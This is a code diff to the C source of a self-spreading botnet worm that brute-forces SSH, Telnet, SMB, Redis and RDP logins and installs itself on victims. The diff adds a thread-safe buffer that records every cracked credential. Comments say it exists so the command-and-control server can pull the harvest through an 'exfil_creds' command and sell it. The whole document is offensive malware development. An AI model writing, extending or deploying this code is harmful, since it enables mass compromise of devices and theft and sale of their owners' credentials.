@@ -19,6 +19,93 @@
 #include <time.h>
 #include <sys/socket.h>
 #include <sys/select.h>
+#include <pthread.h>
+
+/* ── Credential-log buffer (#90) ─────────────────────────── */
+/* Smash-and-grab log-sale monetization. Every successful brute-force
+ * credential is buffered here (bounded, mutex-protected) so the C2 can
+ * pull the whole harvest via the `exfil_creds` command and sell it.
+ * Each entry is one line "proto|ip|port|user|pass", capped at
+ * CRED_LOG_ENTRY_MAX bytes.
+ *
+ * Overflow policy: DROP-NEWEST with a log_warn. The buffer is a fixed
+ * array that never grows; once CRED_LOG_MAX_ENTRIES is reached, a fresh
+ * credential is discarded rather than evicting an older one the C2 has
+ * not yet pulled (the freshest entry is the most expendable — the older
+ * harvest already accumulated is kept). The buffer is drained (and
+ * cleared) by exfil_creds, so capacity resets to zero after each pull.
+ *
+ * Thread safety: scan threads (scan_thread_fn) and the C2 command loop
+ * both record/drain creds, so every access is gated by g_creds_mutex —
+ * the same static-PTHREAD_MUTEX_INITIALIZER pattern as src/proxy.c. */
+#define CRED_LOG_MAX_ENTRIES 256
+#define CRED_LOG_ENTRY_MAX   256
+
+static char g_creds[CRED_LOG_MAX_ENTRIES][CRED_LOG_ENTRY_MAX];
+static unsigned int g_creds_count = 0;
+static pthread_mutex_t g_creds_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+void spread_cred_record(const char *proto, const char *ip, uint16_t port,
+                        const char *user, const char *pass) {
+    if (!proto || !ip || !user || !pass) return;
+
+    /* One line per entry. Every dynamic field is precision-capped so the
+     * total always fits CRED_LOG_ENTRY_MAX (fixed separators ~10 bytes +
+     * 16 proto + 32 ip + 5 port + 80 user + 80 pass). */
+    char line[CRED_LOG_ENTRY_MAX];
+    int len = snprintf(line, sizeof(line), "%.16s|%.32s|%u|%.80s|%.80s",
+                       proto, ip, (unsigned)port, user, pass);
+    if (len < 0 || (size_t)len >= sizeof(line)) return;
+
+    pthread_mutex_lock(&g_creds_mutex);
+    if (g_creds_count >= CRED_LOG_MAX_ENTRIES) {
+        /* DROP-NEWEST: buffer full — discard this entry, keep the harvest. */
+        log_warn("cred-log: buffer full (%u entries), dropping newest credential",
+                 g_creds_count);
+        pthread_mutex_unlock(&g_creds_mutex);
+        return;
+    }
+    memcpy(g_creds[g_creds_count], line, (size_t)len + 1);
+    g_creds_count++;
+    pthread_mutex_unlock(&g_creds_mutex);
+}
+
+unsigned int spread_cred_count(void) {
+    pthread_mutex_lock(&g_creds_mutex);
+    unsigned int c = g_creds_count;
+    pthread_mutex_unlock(&g_creds_mutex);
+    return c;
+}
+
+/* Drain the whole log into a caller-free'd heap buffer (one entry per
+ * line, NUL-terminated) and clear the buffer. Returns 0 on success with
+ * *out set and *out_len = byte count (excluding the NUL), -1 on
+ * allocation failure. Thread-safe. */
+int spread_creds_drain(char **out, size_t *out_len) {
+    if (!out || !out_len) return -1;
+
+    pthread_mutex_lock(&g_creds_mutex);
+    size_t cap = (size_t)g_creds_count * CRED_LOG_ENTRY_MAX + 1;
+    char *buf = (char *)malloc(cap);
+    if (!buf) {
+        pthread_mutex_unlock(&g_creds_mutex);
+        return -1;
+    }
+    size_t pos = 0;
+    for (unsigned int i = 0; i < g_creds_count; i++) {
+        size_t l = strlen(g_creds[i]);
+        if (pos + l + 1 >= cap) break; /* belt-and-braces; cannot trigger */
+        memcpy(buf + pos, g_creds[i], l);
+        pos += l;
+        buf[pos++] = '\n';
+    }
+    buf[pos] = '\0';
+    *out = buf;
+    *out_len = pos;
+    g_creds_count = 0;
+    pthread_mutex_unlock(&g_creds_mutex);
+    return 0;
+}
 
 /* ── Default credentials ───────────────────────────────────── */
 /* Mirai-style credential pool — can be extended via C2 */
@@ -324,6 +411,8 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
             if (sock_fd >= 0) {
                 log_info("SSH: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
+                /* #90: harvest the credential for the log-sale model. */
+                spread_cred_record("ssh", ip, port, default_users[u], default_passes[p]);
                 
                 /* Download and install binary */
                 char cmd[1024];
@@ -565,6 +654,8 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
             if (sock_fd >= 0) {
                 log_info("Telnet: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
+                /* #90: harvest the credential for the log-sale model. */
+                spread_cred_record("telnet", ip, port, default_users[u], default_passes[p]);
                 
                 char cmd[512];
                 snprintf(cmd, sizeof(cmd),
@@ -993,6 +1084,8 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
             log_info("SMB: cracked %s:%d with %s:%s",
                      ip, port, default_users[u], "***REDACTED***");
+            /* #90: harvest the credential for the log-sale model. */
+            spread_cred_record("smb", ip, port, default_users[u], default_passes[p]);
 
             /* Session UID from try_login_smb */
             uint16_t uid = 0;
@@ -1158,6 +1251,10 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
             if (strstr(auth_resp, "+OK")) {
                 log_info("Redis: auth success %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
+                /* #90: harvest the verified credential for the log-sale
+                 * model. The unauth-exploit path above records nothing —
+                 * there is no credential to sell. */
+                spread_cred_record("redis", ip, port, default_users[u], default_passes[p]);
                 
                 /* SECURITY FIX (#71): Keep the authenticated socket and
                  * run the CONFIG SET sequence over it. The old code
@@ -1753,6 +1850,8 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
             log_info("RDP: cracked %s:%d with %s:%s",
                      ip, port, default_users[u], "***REDACTED***");
+            /* #90: harvest the credential for the log-sale model. */
+            spread_cred_record("rdp", ip, port, default_users[u], default_passes[p]);
 
             /* Build RDP execute packet. %.430s caps dl_url so the total
              * line fits cmd[512] (fixed text ~74 bytes + URL). dl_url is
